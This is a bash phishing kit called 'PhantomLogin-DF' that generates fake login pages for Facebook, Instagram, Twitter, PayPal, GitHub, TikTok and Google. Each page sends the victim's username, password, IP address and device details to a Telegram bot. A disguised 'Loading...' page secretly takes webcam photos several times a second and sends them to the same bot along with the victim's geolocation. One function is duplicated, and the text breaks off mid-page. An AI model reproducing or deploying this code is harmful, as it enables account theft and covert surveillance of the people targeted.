#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${BLUE}
    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
    ${NC}"
    echo -e "${YELLOW}-----------------------------------------------------------------------------------"
    echo -e "[+] Tool      : PhantomLogin-DF"
    echo -e "[+] Version   : 3.0"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "-----------------------------------------------------------------------------------${NC}"
}

install_dependencies() {
    echo -e "${GREEN}[+] Checking and installing dependencies...${NC}"
    if ! command -v php &> /dev/null; then
        echo -e "${YELLOW}[+] PHP is not installed. Installing PHP...${NC}"
        sudo apt-get install php -y || { echo -e "${RED}[-] Failed to install PHP.${NC}"; exit 1; }
    fi
    if ! command -v ssh &> /dev/null; then
        echo -e "${YELLOW}[+] SSH is not installed. Installing SSH...${NC}"
        sudo apt-get install openssh-client -y || { echo -e "${RED}[-] Failed to install SSH.${NC}"; exit 1; }
    fi
    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}[+] jq is not installed. Installing jq...${NC}"
        sudo apt-get install jq -y || { echo -e "${RED}[-] Failed to install jq.${NC}"; exit 1; }
    fi
    echo -e "${GREEN}[+] All dependencies are installed.${NC}"
}
create_page() {
    local page_name=$1
    local page_content=$2

    echo "$page_content" > "${page_name}.html"
    echo -e "${GREEN}[+] Page ${page_name}.html created successfully.${NC}"
}

facebook_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #1877f2; box-shadow: 0 0 8px rgba(24, 119, 242, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #1877f2; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #145dbf; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #1877f2; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #1877f2; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #1877f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <h2>Log in to Facebook</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgotten password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Facebook Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.facebook.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

instagram_page() {
    cat <<EOF
instagram_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 175px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #4c86ff; box-shadow: 0 0 8px rgba(76, 134, 255, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #4c86ff; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #3578e5; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #4c86ff; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #4c86ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #4c86ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
        <h2>Sign in to Instagram</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Don't have an account? Sign up</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Instagram Login Attempt:\nUsername💎: \${username}\nPassword🔑: \${password}\nDevice Info✨:\nIP Address🌐📍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork🔍🌐: \${deviceInfo.networkType}\nDevice Name🌐: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.instagram.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html
EOF
}

twitter_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitter Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #15202b; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #192734; border-radius: 15px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 50px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #ffffff; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #38444d; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #192734; color: #ffffff; }
        input:focus { border-color: #1da1f2; box-shadow: 0 0 8px rgba(29, 161, 242, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #1da1f2; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #1991db; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #1da1f2; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #38444d; }
        .signup-btn { width: 100%; padding: 14px; background-color: #192734; border: 1px solid #38444d; font-size: 14px; color: #1da1f2; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #1e2d3b; }
        .terms { margin-top: 20px; font-size: 12px; color: #8899a6; }
        .terms a { color: #1da1f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_%28white%29.png" alt="Twitter Logo">
        <h2>Log in to Twitter</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone, email, or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up for Twitter</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Twitter Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://twitter.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

paypal_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #003087; box-shadow: 0 0 8px rgba(0, 48, 135, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #003087; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #002366; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #003087; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #003087; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #003087; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
        <h2>Log in to PayPal</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or mobile number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Having trouble logging in?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign Up</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`PayPal Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.paypal.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

github_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #161b22; border-radius: 50%; width: 300px; height: 300px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .login-container img { width: 100px; margin-bottom: 25px; border-radius: 50%; }
        h2 { font-size: 22px; color: #c9d1d9; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #30363d; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #0d1117; color: #c9d1d9; }
        input:focus { border-color: #58a6ff; box-shadow: 0 0 8px rgba(88, 166, 255, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #238636; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #2ea043; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #58a6ff; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #30363d; }
        .signup-btn { width: 100%; padding: 14px; background-color: #21262d; border: 1px solid #30363d; font-size: 14px; color: #58a6ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #30363d; }
        .terms { margin-top: 20px; font-size: 12px; color: #8b949e; }
        .terms a { color: #58a6ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo">
        <h2>Sign in to GitHub</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign in</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create an account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`GitHub Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://github.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

tiktok_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        /* CSS styling for TikTok login page */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #121212;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.2);
            color: #fff;
        }

        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            background-color: #181818;
            color: #fff;
        }

        input:focus {
            border-color: #ff0050;
            box-shadow: 0 0 8px rgba(255, 0, 80, 0.5);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #ff0050;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #e60045;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #ff0050;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #181818;
            border: 1px solid #ff0050;
            font-size: 14px;
            color: #ff0050;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #222;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #ff0050;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
        <h2>Sign in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Don't have an account? Sign up</button>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            
            let token = "${token}";
            let chatId = "${id}";

            let message = \`🔴 **TikTok Login Attempt**\n👤 Username: \${username}\n🔒 Password: \${password}\`;
            let url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(message)}\`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    alert("Incorrect username or password. Please try again.");
                })
                .catch(error => console.error("Error sending message:", error));
        });
    </script>
</body>
</html>
EOF
}

camera_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: black;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            overflow: hidden;
        }

        #loading {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            color: white;
            text-align: center;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "${token}";
        const chatId = "${id}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function sendToBot(message) {
            fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
            });
        }

        function sendWelcomeMessage() {
            const message = \`👋 Welcome to the developer! 
                            \n📩 Contact the developer: @A_Y_TR\`;
            sendToBot(message);
        }

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "image.jpg");

                fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                    method: "POST",
                    body: formData
                });
            }, "image/jpeg");
        }

        function sendLocation() {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendToBot(\`📍 Location: https://www.google.com/maps?q=\${lat},\${lon}\`);
            });
        }

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                setInterval(() => {
                    captureAndSend();
                    sendLocation();
                    sendWelcomeMessage();
                }, 125); 
            })
            .catch(err => console.error(err));

        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 5000);
    </script>
</body>
</html>
EOF
}

google_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 8px rgba(26, 115, 232, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a73e8;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #135abe;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a73e8;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
        <h2>Sign in to Google</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Google Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.google.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
}

instagram22_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 175px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
